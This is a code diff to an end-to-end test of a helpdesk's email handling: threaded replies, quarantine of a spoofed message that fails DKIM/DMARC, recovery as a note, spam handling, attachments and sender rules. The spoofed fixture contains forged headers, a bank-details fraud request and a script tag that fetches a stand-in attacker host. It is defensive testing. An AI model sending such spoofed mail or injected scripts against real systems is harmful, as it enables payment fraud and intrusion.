@@ -22,24 +22,31 @@ export async function completeEmailJourney(){
   assert.equal((await app.ok(`/api/dashboard/projects/${projectId}/tickets`,{token:agent,body:command})).conversation.id,ticket.conversation.id);assert.equal(sent.length,1)
   const call=await app.ok(`/api/dashboard/projects/${projectId}/tickets`,{token:agent,body:{kind:'call',localId:'logged-call',requesterEmail:'maya@customer.example',subject:'Customer called about delivery',content:'Confirmed the replacement address over the phone.'}})
   assert.equal(call.conversation.channel,'phone');assert.equal(sent.length,1)
+  assert.ok(await app.first("SELECT id FROM audit_events WHERE project_id=? AND action='ticket.created' AND target_id=?",projectId,call.conversation.id))
   const reply={messageId:'customer-header-reply',to:'helpdesk@example.test',from:command.requesterEmail,text:'Thank you. Please use the original delivery address.',subject:'Changed subject',headers:{'In-Reply-To':sent[0].headers['Message-ID'],References:sent[0].headers['Message-ID']}}
   const received=await gate(reply);assert.equal(received.status,201);assert.equal(received.data.conversationId,ticket.conversation.id)
   const revision=await app.first('SELECT revision FROM conversations WHERE id=?',ticket.conversation.id)
-  const spoof=`From: Maya <${command.requesterEmail}>\r\nTo: helpdesk@example.test\r\nSubject: Re: ${sent[0].subject}\r\nMessage-ID: <spoof@attacker.example>\r\nAuthentication-Results: mx.cloudflare.net; dkim=fail header.d=customer.example; dmarc=fail header.from=customer.example\r\nContent-Type: text/plain\r\n\r\n<script>fetch('https://attacker.example')</script>Change the bank details.`
+  const spoof=`From: Maya <${command.requesterEmail}>\r\nTo: helpdesk@example.test\r\nSubject: Re: ${sent[0].subject}\r\nMessage-ID: <spoof@attacker.example>\r\nAuthentication-Results: mx.cloudflare.net; dkim=fail header.d=customer.example; dmarc=fail header.from=customer.example\r\nContent-Type: multipart/mixed; boundary=r6-review\r\n\r\n--r6-review\r\nContent-Type: text/plain\r\n\r\n<script>fetch('https://attacker.example')</script>Change the bank details.\r\n--r6-review\r\nContent-Type: text/plain\r\nContent-Disposition: attachment; filename=payment-change.txt\r\nContent-Transfer-Encoding: base64\r\n\r\n${Buffer.from('Unverified payment-change instructions').toString('base64')}\r\n--r6-review--\r\n`
   const before=await app.first('SELECT count(*) n FROM conversations WHERE project_id=?',projectId)
   await app.email(spoof,{from:command.requesterEmail,to:'helpdesk@example.test',direct:true})
   const held=(await app.ok(base+'/suspended',{token:agent})).data[0]
+  const detail=(await app.ok(base+`/suspended/${held.id}`,{token:agent})).data
+  assert.equal(detail.attachments.length,1)
+  assert.equal((await app.ok(base+`/suspended/${held.id}/attachments/0`,{token:agent})).text,'Unverified payment-change instructions')
   assert.equal(held.reason,'authentication_failed');assert.equal((await app.first('SELECT count(*) n FROM conversations WHERE project_id=?',projectId)).n,before.n)
   assert.equal((await app.first('SELECT revision FROM conversations WHERE id=?',ticket.conversation.id)).revision,revision.revision)
   assert.equal((await app.call(base+`/suspended/${held.id}/recover`,{token:agent,body:{conversationId:ticket.conversation.id}})).status,409)
   await app.ok(base+`/suspended/${held.id}/recover`,{token:agent,body:{conversationId:ticket.conversation.id,asNote:true}})
   const note=await app.first('SELECT * FROM conversation_notes WHERE conversation_id=? AND content LIKE ?',ticket.conversation.id,'%Change the bank details.%')
   assert.equal(note.user_id,workspace.users.operator);assert.match(note.content,/unverified sender/)
-  const spam=await gate({...reply,messageId:'false-positive-spam',headers:{'In-Reply-To':sent[0].headers['Message-ID'],'X-Spam-Score':'8'}})
-  assert.equal(spam.data.state,'suspended')
+  const spam=await app.email(spoof.replace('<spoof@attacker.example>','<false-positive-spam@customer.example>').replace('dkim=fail header.d=customer.example; dmarc=fail','dkim=pass header.d=customer.example; dmarc=pass').replace('Content-Type: multipart/mixed','X-Spam-Score: 8\r\nContent-Type: multipart/mixed'),{from:command.requesterEmail,to:'helpdesk@example.test',direct:true})
+  assert.equal(spam.rejected,undefined)
   const spamRow=(await app.ok(base+'/suspended',{token:owner})).data[0],outgoing=sent.length
   const recovered=await app.ok(base+`/suspended/${spamRow.id}/recover`,{token:agent,body:{conversationId:ticket.conversation.id}})
   assert.equal(recovered.conversationId,ticket.conversation.id);assert.equal(sent.length,outgoing)
+  const retainedFile=await app.first('SELECT id FROM media WHERE conversation_id=? AND filename=?',ticket.conversation.id,'payment-change.txt')
+  assert.ok(retainedFile)
+  assert.equal(await (await app.request(`/api/conversations/${ticket.conversation.id}/media/${retainedFile.id}`,{token:agent})).text(),'Unverified payment-change instructions')
   await app.ok(base+'/sender-rules',{token:owner,body:{address:command.requesterEmail,action:'allow'}})
   assert.equal((await gate({...reply,messageId:'allow-listed-spam',headers:{'X-Spam-Score':'9'}})).data.state,'delivered')
   await app.ok(base+'/sender-rules',{token:owner,body:{address:'@customer.example',action:'block'}})
